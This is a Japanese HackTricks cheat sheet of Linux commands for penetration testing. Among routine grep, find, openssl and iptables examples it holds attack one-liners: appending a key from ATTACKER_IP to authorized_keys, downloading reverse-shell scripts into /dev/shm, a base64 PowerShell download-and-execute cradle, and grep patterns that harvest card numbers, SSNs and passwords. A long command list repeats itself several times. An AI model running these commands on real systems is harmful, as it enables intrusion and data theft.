# 便利なLinuxコマンド

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

## Common Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Windows用のBash
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## グレップ
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## 検索
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap検索のヘルプ
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

### Description
Bash is a Unix shell and command language. It is the default shell on most Linux distributions and macOS.

### Useful Commands

- `history`: Displays the command history.
- `alias`: Creates an alias for a command.
- `unalias`: Removes an alias.
- `source`: Executes commands from a file in the current shell.
- `echo $SHELL`: Displays the current shell.
- `echo $0`: Displays the name of the shell or script.
- `echo $PATH`: Displays the directories where the shell looks for commands.
- `which [command]`: Displays the location of a command.
- `type [command]`: Displays how a command is interpreted.
- `man [command]`: Displays the manual for a command.
- `apropos [keyword]`: Searches the manual page names and descriptions for a keyword.
- `whatis [command]`: Displays a one-line description of a command.
- `whereis [command]`: Displays the binary, source, and manual page files for a command.
- `help [builtin]`: Displays help information for shell builtins.
- `exit`: Exits the shell.
- `Ctrl + C`: Interrupts the current command.
- `Ctrl + Z`: Suspends the current command.
- `bg`: Resumes a suspended command in the background.
- `fg`: Brings a background command to the foreground.
- `jobs`: Lists the current jobs.
- `kill [PID]`: Sends a signal to a process.
- `ps`: Displays information about processes.
- `top`: Displays real-time system information.
- `uptime`: Displays how long the system has been running.
- `free`: Displays memory usage.
- `df`: Displays disk space usage.
- `du`: Displays file and directory disk usage.
- `ls`: Lists directory contents.
- `cd`: Changes the current directory.
- `pwd`: Displays the current working directory.
- `mkdir`: Creates a new directory.
- `rm`: Removes files or directories.
- `cp`: Copies files or directories.
- `mv`: Moves or renames files or directories.
- `touch`: Creates an empty file or updates the access and modification times of a file.
- `cat`: Concatenates and displays file contents.
- `more`: Displays file contents one screen at a time.
- `less`: Displays file contents with advanced features.
- `head`: Displays the beginning of a file.
- `tail`: Displays the end of a file.
- `grep`: Searches for patterns in files.
- `find`: Searches for files and directories.
- `wc`: Displays the number of lines, words, and characters in a file.
- `chmod`: Changes file permissions.
- `chown`: Changes file owner and group.
- `chgrp`: Changes file group ownership.
- `ln`: Creates links between files.
- `tar`: Archives files.
- `gzip`: Compresses files.
- `gunzip`: Decompresses files.
- `ssh`: Connects to a remote machine using SSH.
- `scp`: Copies files securely between hosts.
- `rsync`: Syncs files and directories between hosts.
- `wget`: Downloads files from the web.
- `curl`: Transfers data from or to a server.
- `ping`: Tests network connectivity.
- `traceroute`: Traces the route to a host.
- `ifconfig`: Configures network interfaces.
- `netstat`: Displays network connections.
- `iptables`: Manages firewall rules.
- `systemctl`: Controls the systemd system and service manager.
- `journalctl`: Views and manages journal logs.
- `crontab`: Manages cron jobs.
- `at`: Schedules commands to be executed at a later time.
- `watch`: Executes a program periodically.
- `lsof`: Lists open files.
- `ss`: Displays socket statistics.
- `strace`: Traces system calls and signals.
- `tcpdump`: Captures and analyzes network traffic.
- `nc`: Netcat utility for reading from and writing to network connections.
- `awk`: Processes and analyzes text files.
- `sed`: Edits text using scripts.
- `grep`: Searches for patterns in files.
- `sort`: Sorts lines of text.
- `uniq`: Filters adjacent matching lines.
- `cut`: Extracts sections from each line of a file.
- `paste`: Merges lines from multiple files.
- `diff`: Compares files line by line.
- `patch`: Applies changes to files.
- `tr`: Translates or deletes characters.
- `tee`: Reads from standard input and writes to standard output and files.
- `xargs`: Builds and executes command lines from standard input.
- `bc`: Calculator.
- `date`: Displays or sets the system date and time.
- `cal`: Displays a calendar.
- `uptime`: Displays how long the system has been running.
- `who`: Displays who is logged on.
- `w`: Displays who is logged on and what they are doing.
- `last`: Displays last logins.
- `uname`: Displays system information.
- `hostname`: Displays or sets the system's hostname.
- `dmesg`: Displays boot messages.
- `lsmod`: Displays loaded kernel modules.
- `modinfo`: Displays information about a kernel module.
- `modprobe`: Adds or removes kernel modules from the Linux kernel.
- `insmod`: Inserts a module into the Linux kernel.
- `rmmod`: Removes a module from the Linux kernel.
- `journalctl`: Views and manages the systemd journal.
- `systemctl`: Controls the systemd system and service manager.
- `timedatectl`: Controls the system time and date.
- `hostnamectl`: Controls the system hostname.
- `loginctl`: Controls the systemd login manager.
- `chage`: Changes user password expiry information.
- `passwd`: Changes user password.
- `useradd`: Adds a new user.
- `userdel`: Deletes a user.
- `usermod`: Modifies a user.
- `groupadd`: Adds a new group.
- `groupdel`: Deletes a group.
- `groupmod`: Modifies a group.
- `chown`: Changes file owner and group.
- `chmod`: Changes file permissions.
- `chgrp`: Changes file group ownership.
- `su`: Switches user.
- `sudo`: Executes a command as another user.
- `visudo`: Edits the sudoers file.
- `adduser`: Adds a new user and configures the account.
- `deluser`: Deletes a user and their configuration files.
- `passwd`: Changes user password.
- `usermod`: Modifies a user account.
- `groupadd`: Adds a new group.
- `groupdel`: Deletes a group.
- `groupmod`: Modifies a group.
- `chage`: Changes user password expiry information.
- `chsh`: Changes the user's login shell.
- `id`: Displays user and group information.
- `whoami`: Displays the current user.
- `groups`: Displays the groups a user is in.
- `w`: Displays who is logged on and what they are doing.
- `last`: Displays last logins.
- `finger`: Displays information about users.
- `ps`: Displays information about processes.
- `top`: Displays real-time system information.
- `kill`: Sends a signal to a process.
- `killall`: Kills processes by name.
- `pkill`: Sends a signal to processes based on name.
- `pgrep`: Looks up processes based on name.
- `nice`: Runs a command with modified scheduling priority.
- `renice`: Alters the priority of running processes.
- `at`: Schedules commands to be executed at a later time.
- `batch`: Executes commands when system load levels permit.
- `crontab`: Manages cron jobs.
- `watch`: Executes a program periodically.
- `uptime`: Displays how long the system has been running.
- `free`: Displays memory usage.
- `vmstat`: Displays virtual memory statistics.
- `iostat`: Displays I/O statistics.
- `sar`: Collects and reports system activity information.
- `lsof`: Lists open files.
- `netstat`: Displays network connections.
- `ss`: Displays socket statistics.
- `tcpdump`: Captures and analyzes network traffic.
- `strace`: Traces system calls and signals.
- `ltrace`: Traces library calls.
- `ldd`: Displays shared library dependencies.
- `nm`: Lists symbols from object files.
- `objdump`: Displays information from object files.
- `readelf`: Displays information about ELF files.
- `file`: Determines file type.
- `strings`: Finds printable strings in files.
- `hexdump`: Displays file contents in hexadecimal.
- `xxd`: Creates a hex dump of a file.
- `diff`: Compares files line by line.
- `patch`: Applies changes to files.
- `wc`: Displays the number of lines, words, and characters in a file.
- `grep`: Searches for patterns in files.
- `sed`: Edits text using scripts.
- `awk`: Processes and analyzes text files.
- `cut`: Extracts sections from each line of a file.
- `sort`: Sorts lines of text.
- `uniq`: Filters adjacent matching lines.
- `tr`: Translates or deletes characters.
- `tee`: Reads from standard input and writes to standard output and files.
- `xargs`: Builds and executes command lines from standard input.
- `bc`: Calculator.
- `expr`: Evaluates expressions.
- `seq`: Generates sequences of numbers.
- `bc`: Calculator.
- `dc`: Desk calculator.
- `factor`: Factors numbers.
- `pr`: Formats files for printing.
- `fold`: Wraps lines to fit a specified width.
- `fmt`: Formats text for printing.
- `nl`: Numbers lines in a file.
- `od`: Dumps files in octal and other formats.
- `join`: Joins lines of two files on a common field.
- `paste`: Merges lines from multiple files.
- `sort`: Sorts lines of text.
- `shuf`: Shuffles input lines.
- `split`: Splits files into pieces.
- `tr`: Translates or deletes characters.
- `uniq`: Filters adjacent matching lines.
- `wc`: Displays the number of lines, words, and characters in a file.
- `head`: Displays the beginning of a file.
- `tail`: Displays the end of a file.
- `cat`: Concatenates and displays file contents.
- `tac`: Concatenates and displays file contents in reverse.
- `rev`: Reverses lines in a file.
- `grep`: Searches for patterns in files.
- `sed`: Edits text using scripts.
- `awk`: Processes and analyzes text files.
- `diff`: Compares files line by line.
- `patch`: Applies changes to files.
- `tar`: Archives files.
- `gzip`: Compresses files.
- `gunzip`: Decompresses files.
- `bzip2`: Compresses files using the Burrows-Wheeler algorithm.
- `bzcat`: Decompresses files compressed by bzip2.
- `xz`: Compresses files using the LZMA algorithm.
- `unxz`: Decompresses files compressed by xz.
- `lzma`: Compresses files using the LZMA algorithm.
- `unlzma`: Decompresses files compressed by lzma.
- `zip`: Archives files using the ZIP format.
- `unzip`: Extracts files from ZIP archives.
- `7z`: Archives files using the 7z format.
- `unrar`: Extracts files from RAR archives.
- `tar`: Archives files.
- `gzip`: Compresses files.
- `gunzip`: Decompresses files.
- `bzip2`: Compresses files using the Burrows-Wheeler algorithm.
- `bzcat`: Decompresses files compressed by bzip2.
- `xz`: Compresses files using the LZMA algorithm.
- `unxz`: Decompresses files compressed by xz.
- `lzma`: Compresses files using the LZMA algorithm.
- `unlzma`: Decompresses files compressed by lzma.
- `zip`: Archives files using the ZIP format.
- `unzip`: Extracts files from ZIP archives.
- `7z`: Archives files using the 7z format.
- `unrar`: Extracts files from RAR archives.
- `tar`: Archives files.
- `gzip`: Compresses files.
- `gunzip`: Decompresses files.
- `bzip2`: Compresses files using the Burrows-Wheeler algorithm.
- `bzcat`: Decompresses files compressed by bzip2.
- `xz`: Compresses files using the LZMA algorithm.
- `unxz`: Decompresses files compressed by xz.
- `lzma`: Compresses files using the LZMA algorithm.
- `unlzma`: Decompresses files compressed by lzma.
- `zip`: Archives files using the ZIP format.
- `unzip`: Extracts files from ZIP archives.
- `7z`: Archives files using the 7z format.
- `unrar`: Extracts files from RAR archives.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

### 概要
IptablesはLinuxシステムで使用されるファイアウォールユーティリティです。ネットワークトラフィックを監視し、許可された通信のみを許可するためのルールを設定することができます。

### 一般的なコマンド
以下はIptablesでよく使用されるコマンドの一部です。

- `iptables -L`: 現在のファイアウォールルールをリスト表示します。
- `iptables -F`: すべてのファイアウォールルールをフラッシュ（削除）します。
- `iptables -A`: ファイアウォールルールに新しいルールを追加します。
- `iptables -D`: ファイアウォールルールから特定のルールを削除します。

### 例
```bash
# ファイアウォールルールをリスト表示
iptables -L

# ファイアウォールルールに新しいルールを追加
iptables -A INPUT -s 192.168.1.1 -j ACCEPT

# ファイアウォールルールから特定のルールを削除
iptables -D INPUT -s 192.168.1.1 -j ACCEPT
```
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
* **ハッキングテクニックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリに提出してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
